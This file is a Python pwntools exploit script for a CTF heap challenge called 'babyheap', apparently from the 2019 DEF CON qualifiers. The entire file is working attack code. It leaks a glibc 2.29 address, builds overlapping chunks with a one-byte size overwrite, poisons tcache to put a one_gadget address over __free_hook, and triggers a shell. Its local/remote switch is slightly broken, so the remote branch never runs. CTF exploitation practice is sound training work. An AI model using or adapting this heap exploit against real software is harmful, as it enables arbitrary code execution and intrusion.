#!/usr/bin/env python
from pwn import *
import sys
from time import time, sleep
import ctypes
import threading
import struct
import IPython
from Crypto.Cipher import AES

BINARY = './babyheap'
LIBC = './libc-2.29.so'

H,P = ('babyheap.quals2019.oooverflow.io', 5000)
LEVEL = 'INFO'
#LEVEL = 'DEBUG'

# Set context for asm
context.clear()
context(os='linux', arch='amd64', bits=64)
context.log_level = LEVEL
context.terminal = ['tmux', 'splitw', '-h']

def connection(t):
    if t ==  'remote':
        r = remote(H, P, level=LEVEL)
    else:
        if t == 'local':
                r = process(BINARY, level=LEVEL)
        else:
                r = process(argv=['./ld-2.29.so', BINARY], env = {'LD_PRELOAD' : '{}'.format(LIBC)}, level=LEVEL)
    return r
    
def read_menu(r):
    return r.recvuntil('> ')

def malloc(r, size, content):
    read_menu(r)
    r.sendline('M')
    r.sendlineafter('> ', str(size))
    r.sendafter('> ', content)

def show(r, idx):
    read_menu(r)
    r.sendline('S')
    r.sendlineafter('> ', str(idx))
    
def free(r, idx):
    read_menu(r)
    r.sendline('F')
    r.sendlineafter('> ', str(idx))
    


def exploit(elf, libc, local):
    r = connection(local)
    #if local:
    #    gdb.attach(r, '''
    #    ''')
        

    for i in range(7):
        malloc(r, 0x178, "A\n")
    
    malloc(r, 0x178, "A\n") # [7]
    malloc(r, 0x178, "A\n") # [8]
    
    for i in range(7):
        free(r, i)
        
    free(r, 7)
    
    malloc(r, 0xf8, "\n") # [0]
    
    show(r, 0) 
    dump = r.recvuntil('-----Yet')
    libc_dump = u64(dump.split('\n')[0].ljust(8, '\0'))
    libc.address = libc_dump - 0x1e4e10
    magic = libc.address + 0xe2383
    log.success("libc @ {}".format(hex(libc.address)))
    
    # empty unsorted
    malloc(r, 0xf8, "\n") # [1]
    
    # get space in tcache
    malloc(r, 0x178, "A\n") # [2]
    malloc(r, 0x178, "A\n") # [3]
    
    # setup chunks 
    malloc(r, 0xf8, "A\n") # [4]
    malloc(r, 0xf8, "A\n") # [5]
    malloc(r, 0xf8, "A\n") # [6]
    
    free(r, 6)
    free(r, 4)
    
    # overwrite middle size
    malloc(r, 0xf8, "A"*0xf8+"\x81"+"\n") # [4]
    

    free(r, 5)
    
    # get overlapping
    malloc(r, 0x178, 0xf8*"A" + "B"*8 + p64(libc.symbols['__free_hook']).strip('\0') + '\0') # [5]
    
    # mmmmm incommmminnngggg
    malloc(r, 0xf8, "\n") # [6]
    malloc(r, 0xf8, p64(magic).strip('\0') + '\0') # [7]
    
    # trigger one_gadget
    free(r, 6)
    r.interactive()
    


if __name__ == '__main__':
    if BINARY:
        elf = ELF(BINARY)
    else:
        elf = None

    if len(sys.argv) < 2:
        print 'Usage: {} <local|remote>'.format(sys.argv[0])
        sys.exit(1)
    elif sys.argv[1] == 'remote':
        if LIBC:
            libc = ELF(LIBC)
        else:
            libc = None
        exploit(elf, libc, False)
    else:
        if LIBC:
           libc = ELF(LIBC)
        else:
           libc = None
        exploit(elf, libc, True)
